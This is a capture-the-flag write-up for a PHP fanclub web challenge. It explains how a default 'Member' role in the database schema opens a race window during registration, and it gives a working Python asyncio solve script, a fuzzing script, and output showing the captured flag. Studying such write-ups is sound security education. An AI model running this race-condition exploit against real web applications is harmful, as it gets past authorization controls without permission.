# Firebird Chan's Fanclub (First Blooded)

<details><summary><strong>Table of Contents</strong></summary>

- [Overview](#overview)
- [Background](#background)
- [Enumeration](#enumeration)
- [Exploitation](#exploitation)
- [Conclusion](#conclusion)

</details>

## Overview

- Solved by: @siunam
- 1 solves / 1000 points
- Author: @vow
- Overall difficulty for me (From 1-10 stars): ★★★★★☆☆☆☆☆

## Background

Firebird Chan made her own fanclub website!

I heard that if you become a member of the fanclub, you can get a flag!

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKUST-Firebird-CTF-Competition-2025/images/Pasted%20image%2020250113175556.png)

## Enumeration

Index page:

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKUST-Firebird-CTF-Competition-2025/images/Pasted%20image%2020250113185010.png)

When we go to the index page, it redirects us to `/login.php`, which means we need to be authenticated first. Let's register a new account and login!

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKUST-Firebird-CTF-Competition-2025/images/Pasted%20image%2020250113185215.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKUST-Firebird-CTF-Competition-2025/images/Pasted%20image%2020250113185224.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKUST-Firebird-CTF-Competition-2025/images/Pasted%20image%2020250113185430.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKUST-Firebird-CTF-Competition-2025/images/Pasted%20image%2020250113185458.png)

After logging in, we can go to the "Play" page to play the quiz:

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKUST-Firebird-CTF-Competition-2025/images/Pasted%20image%2020250113185557.png)

If we answered all 5 questions, we'll be redirected to `/leaderboard.php`, which shows all users' score:

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKUST-Firebird-CTF-Competition-2025/images/Pasted%20image%2020250113185722.png)

We can also go to the "Flag" page. However, it's limited to role "Member":

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKUST-Firebird-CTF-Competition-2025/images/Pasted%20image%2020250113185809.png)

Hmm... Let's figure out how to become a member!

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/HKUST-Firebird-CTF-Competition-2025/Web/Firebird-Chans-Fanclub/source.zip):**
```shell
┌[siunam♥Mercury]-(~/ctf/HKUST-Firebird-CTF-Competition-2025/Web/Firebird-Chan's-Fanclub)-[2025.01.13|18:59:58(HKT)]
└> file source.zip 
source.zip: Zip archive data, at least v2.0 to extract, compression method=store
┌[siunam♥Mercury]-(~/ctf/HKUST-Firebird-CTF-Competition-2025/Web/Firebird-Chan's-Fanclub)-[2025.01.13|18:59:59(HKT)]
└> unzip source.zip 
Archive:  source.zip
   creating: database/
  inflating: database/db.sql         
  inflating: database/Dockerfile     
  inflating: database/my.cnf         
  [...]
  inflating: website/env/register.php  
  inflating: website/env/style.css   
  inflating: website/php.ini
```

After reading the source code a little bit, we can have the following findings:
1. This web application is written in PHP
2. The web application uses DBMS (Database Management System) called MySQL, which stores all the users and scores information

Now, let's dive deeper into the source code!

First off, what's our objective in this challenge? Where's the flag?

In `website/env/flag.php`, we can see that if our session's `role` is `Member`, we can get the flag:

```php
<?php
session_start();
[...]
$flag = getenv("FLAG");
[...]
if (!isset($_SESSION['role']) || $_SESSION['role'] !== "Member") {
    $flag = "You are not a member.";
}

?>
[...]
<p class="title"><?php echo $flag; ?></p>
```

Therefore, **our session's `role` need to somehow to be `Member`**.

Throughout all the SQL queries, they are all using prepared statement, which prevents the typical SQL injection. For example, the login logic (`website/env/login.php`):

```php
if (isset($_POST['username']) && isset($_POST['password']) && !empty($_POST['username']) && !empty($_POST['password'])) {
    $conn = OpenCon();
    $stmt = $conn->prepare("SELECT * FROM users WHERE Username = ?;");
    $stmt->bind_param("s", $_POST['username']);
    $stmt->execute();
    $res = $stmt->get_result();
    $row = $res->fetch_array(MYSQLI_NUM);
    [...]
}
```

As you can see, the above SQL query is prepared using PHP function [`bind_param`](https://www.php.net/manual/en/mysqli-stmt.bind-param.php). By doing so, our user input will not be treated as a SQL command and thus preventing SQL injection vulnerability.

Not only that, all SQL queries get prepared correctly, so there's no direct concatenation in the prepared statement like this:

```php
$role = $_POST['role'];
$stmt = $conn->prepare("SELECT * FROM users WHERE Username = ? AND Role = '$role';");
$stmt->bind_param("s", $_POST['username']);
$stmt->execute();
```

Hmm... How about `website/env/play.php`? Unfortunately, this PHP script is completely useless for us, as there's no code that will change our `role` in the database or update our `$_SESSION['role']`.

Huh, weird. In the leaderboard, we saw that there's a user called "Firebird Chan", and his role is "Member". If we look at `database/db.sql`, this user was inserted into table `users`:

```sql
[...]
-- Time to set a very secure password! - Firebird Chan
INSERT INTO `users` (Username, Password, Role) VALUES ('Firebird Chan', "123", "Member");
INSERT INTO `scores` (Username, Score, Role) VALUES ('Firebird Chan', 5, "Member");
```

Table `users` and `scores`'s schema:

```sql
CREATE TABLE `users` (
    `UserId` INT NOT NULL AUTO_INCREMENT,
    `Username` VARCHAR(255) NOT NULL,
    `Password` TEXT NOT NULL,
    `Role` ENUM('Guest', 'Member') NOT NULL DEFAULT 'Member',
    PRIMARY KEY (UserId),
    UNIQUE (Username)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE `scores` (
    `Username` varchar(255) NOT NULL,
    `Score` INT NOT NULL,
    `Role` ENUM('Guest', 'Member') NOT NULL DEFAULT 'Member',
    PRIMARY KEY (Username),
    UNIQUE (Username)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
```

Wait, look at that SQL comment and the password of user `Firebird Chan`, his password is `123`. Hmm... Does that indicate that this user has an insecure password, so that we need to brute force his password in order to get the flag?

Well... Nope. If we look back to the login logic, we can see that the user's password is checked via PHP function [`password_verify`](https://www.php.net/manual/en/function.password-verify.php):

```php
if (isset($_POST['username']) && isset($_POST['password']) && !empty($_POST['username']) && !empty($_POST['password'])) {
    [...]
    // $row[2] is the fetched user's password from the database
    if ((!empty($row)) && (count($row) === 4) && (password_verify($_POST['password'], $row[2]))) {
        [...]
    }
    [...]
}
```

Huh? That `$row[2]` is the user's correct password. However, in the case of user `Firebird Chan`, the password is `123`. Since **the second parameter of function `password_verify` must be a password hash**, this user cannot be authenticated via this login logic:

```shell
┌[siunam♥Mercury]-(~/ctf/HKUST-Firebird-CTF-Competition-2025/Web/Firebird-Chan's-Fanclub)-[2025.01.13|19:22:12(HKT)]
└> php -a         
[...]
php > var_dump(password_verify("123", "123"));
bool(false)
php > var_dump(password_verify("", "123"));
bool(false)
```

This is because password hash `123` is an invalid hash:

```shell
php > var_dump(password_get_info("123"));
array(3) {
  ["algo"]=>
  NULL
  ["algoName"]=>
  string(7) "unknown"
  ["options"]=>
  array(0) {
  }
}
```

Hmm... That user cannot be logged in via the normal way... How about via the abnormal way?

Because `$_SESSION["username"]` will get HTML escaped via PHP function [`htmlspecialchars`](https://www.php.net/manual/en/function.htmlspecialchars.php) after logging in, maybe there's discrepancy between the database's username and the escaped one?

```php
if (isset($_POST['username']) && isset($_POST['password']) && !empty($_POST['username']) && !empty($_POST['password'])) {
    [...]
    if ((!empty($row)) && (count($row) === 4) && (password_verify($_POST['password'], $row[2]))) {
        // $row[1] is the fetched user's username from the database
        $_SESSION["username"] = htmlspecialchars($row[1]);
        [...]
    }
    [...]
}
```

We can try to register a username like `Firebird Chan<maybe_trimmed_character_here>`. Then, after logging in, because of function `htmlspecialchars`, maybe the last character will be trimmed and thus effectively authenticating as user `Firebird Chan`.

To test this, I'll create the following fuzzing PHP script and run it on the local testing environment:

```php
<?php
$username = "Firebird Chan";

for ($i=0; $i < 0xff + 1; $i++) { 
    $input = $username . chr($i);
    $afterEncoding = htmlspecialchars($input);

    if (strlen($afterEncoding) === strlen($username)) {
        echo "[+] Found a discrepancy! After HTML escaping: $afterEncoding | Hex character: " . dechex($i) . "\n";
    }
}

// check for unicode characters
for ($i=0x1000; $i < 0xffff + 1; $i++) { 
    $input = "Firebird Chan" . mb_chr($i, 'UTF-8');
    $afterEncoding = htmlspecialchars($input);

    if (strlen($afterEncoding) === strlen($username)) {
        echo "[+] Found a discrepancy! After HTML escaping: $afterEncoding | Character: " . dechex($i) . "\n";
    }
}
```

```shell
┌[siunam♥Mercury]-(~/ctf/HKUST-Firebird-CTF-Competition-2025/Web/Firebird-Chan's-Fanclub)-[2025.01.13|19:38:27(HKT)]
└> docker compose up -d
[...]
┌[siunam♥Mercury]-(~/ctf/HKUST-Firebird-CTF-Competition-2025/Web/Firebird-Chan's-Fanclub)-[2025.01.13|19:38:37(HKT)]
└> docker container ls
CONTAINER ID   IMAGE                             COMMAND                  CREATED          STATUS          PORTS                               NAMES
42e27deb1126   firebird-chans-fanclub-website    "docker-php-entrypoi…"   11 minutes ago   Up 11 minutes   0.0.0.0:80->80/tcp, :::80->80/tcp   firebird-chans-fanclub-website-1
[...]
┌[siunam♥Mercury]-(~/ctf/HKUST-Firebird-CTF-Competition-2025/Web/Firebird-Chan's-Fanclub)-[2025.01.13|19:38:46(HKT)]
└> docker cp ./fuzz.php 42e27deb1126:/var/www/html/fuzz.php
Successfully copied 2.56kB to 42e27deb1126:/var/www/html/fuzz.php
```

```shell
┌[siunam♥Mercury]-(~/ctf/HKUST-Firebird-CTF-Competition-2025/Web/Firebird-Chan's-Fanclub)-[2025.01.13|19:40:01(HKT)]
└> docker exec 42e27deb1126 php /var/www/html/fuzz.php
[+] Found a discrepancy! After HTML escaping: Firebird Chan | Character: d800
[+] Found a discrepancy! After HTML escaping: Firebird Chan | Character: d801
[+] Found a discrepancy! After HTML escaping: Firebird Chan | Character: d802
[...]
```

Oh! We did found some discrepancies! However, after a quick test, it wasn't possible. This is because I think MySQL will silently drop characters after hex `0x7f`, so Unicode like `0xd800` will not even get inserted into the database. Moreover, after a quick sanity check, I realized that our `$_SESSION["username"]` has nothing to do with the flag or the `role`. :(

Hmm... What could we possibly can do now?...

If we look back to the table `users`'s schema, **Column `Role`** is bugging me:

```sql
CREATE TABLE `users` (
    [...]
    `Role` ENUM('Guest', 'Member') NOT NULL DEFAULT 'Member',
    [...]
) [...]
```

Wait a minute... **Why the default value is `Member`** (`DEFAULT 'Member'`)???

Let's take a look at the register logic: (`website/env/register.php`)

```php
if (isset($_POST['username']) && isset($_POST['password']) && !empty($_POST['username']) && !empty($_POST['password'])) {
    $role = "Guest";
    [...]
    $conn = OpenCon();
    $stmt = $conn->prepare("INSERT INTO users (Username, Password) VALUES (?, ?);");
    $stmt->bind_param("ss", $_POST['username'], $hashed_password);
    $res = $stmt->execute();
    if ($res === true) {
        $stmt = $conn->prepare("UPDATE users SET Role = ? WHERE Username = ?;");
        $stmt->bind_param("ss", $role, $_POST['username']);
        $stmt->execute();
        [...]
    }
```

In here, the **insert SQL query** didn't insert the `role` value into table `users`! After this new user got inserted into the table, it'll execute the next update SQL query, which sets the new user's role to `Guest` (`$guest`).

Ah ha! When we register a new account, there is **a race window where your role will be `Member`**, as the SQL query didn’t insert the `role` column's value, thus it’s the default value. During this race window, we'll can **login to the newly registered account and get the flag as fast as possible**, so that the update SQL query doesn’t get executed yet.

## Exploitation

Armed with the above information, we can get the flag via the following steps:
1. Keep spamming the login and get flag request (The login username and password is the one in the next step)
2. During the above step, register a new account

To automate the above steps, I wrote the following solve Python script:

<details><summary><strong>solve.py</strong></summary>

```python
#!/usr/bin/env python3
import asyncio
import aiohttp
import random
import re
from string import ascii_letters, digits

class Solver():
    def __init__(self, baseUrl):
        self.baseUrl = baseUrl
        self.RANDOM_USERNAME_AND_PASSWORD = ''.join(random.choice(ascii_letters + digits) for _ in range(10))
        self.REGISTER_ENDPOINT = f'{self.baseUrl}/register.php'
        self.LOGIN_ENDPOINT = f'{self.baseUrl}/login.php'
        self.GET_FLAG_ENDPOINT = f'{self.baseUrl}/flag.php'
        self.LOGIN_REGISTER_BODY_DATA = {
            'username': self.RANDOM_USERNAME_AND_PASSWORD,
            'password': self.RANDOM_USERNAME_AND_PASSWORD
        }
        self.FLAG_REGEX_PATTERN = re.compile('(firebird{.*?})')

    async def sendLoginAndGetFlagRequest(self):
        async with aiohttp.ClientSession() as session:
            # print('[*] Sending login and get flag requests...')
            await session.post(self.LOGIN_ENDPOINT, data=self.LOGIN_REGISTER_BODY_DATA)
            async with session.get(self.GET_FLAG_ENDPOINT) as response:
                if response.status != 200:
                    return None
                
                responseText = await response.text()
                if 'firebird{' not in responseText:
                    return None

                return responseText

    async def register(self):
        print('[*] Waiting for spamming login requests...')
        await asyncio.sleep(1)

        print(f'[*] Registering user {self.RANDOM_USERNAME_AND_PASSWORD}...')
        async with aiohttp.ClientSession() as session:
            await session.post(self.REGISTER_ENDPOINT, data=self.LOGIN_REGISTER_BODY_DATA)
        print('[*] User registered. If there\'s no flag, exit the program, as we didn\'t win the race window')

    async def raceConditionWorker(self, workerNumber):
        print(f'[*] Race condition worker #{workerNumber}: Win the race window in role updating...')

        while True:
            result = await self.sendLoginAndGetFlagRequest()
            if result is not None:
                return result

    async def solve(self, numberOfWorkers=2):
        tasks = list()

        for workerNumber in range(numberOfWorkers):
            tasks.append(self.raceConditionWorker(workerNumber))
        tasks.append(self.register())

        results = await asyncio.gather(*tasks)
        for result in results:
            if result is None:
                continue

            print(result)
            match = self.FLAG_REGEX_PATTERN.search(result)
            if match is None:
                continue

            flag = match.group(1)
            print(f'[+] Flag: {flag}')
            exit(0)

if __name__ == '__main__':
    # baseUrl = 'http://localhost' # for local testing
    baseUrl = 'http://phoenix-chal.firebird.sh:36006'
    solver = Solver(baseUrl)

    numberOfWorkers = 5
    asyncio.run(solver.solve(numberOfWorkers))
```

</details>

```shell
┌[siunam♥Mercury]-(~/ctf/HKUST-Firebird-CTF-Competition-2025/Web/Firebird-Chan's-Fanclub)-[2025.01.13|21:18:08(HKT)]
└> python3 solve.py
[*] Race condition worker #0: Win the race window in role updating...
[*] Race condition worker #1: Win the race window in role updating...
[*] Race condition worker #2: Win the race window in role updating...
[*] Race condition worker #3: Win the race window in role updating...
[*] Race condition worker #4: Win the race window in role updating...
[*] Waiting for spamming login requests...
[*] Registering user KWSfbzOLZ0...
[*] User registered. If there's no flag, exit the program, as we didn't win the race window
[+] Flag: firebird{r4ce_r4c3_rac3_ge7_f1ag_get_fl4g_g3t_fla6}
```

> Note: It might require to take a lot of tries.

- **Flag: `firebird{r4ce_r4c3_rac3_ge7_f1ag_get_fl4g_g3t_fla6}`**

## Conclusion

What we've learned:

1. Multi-endpoint race conditions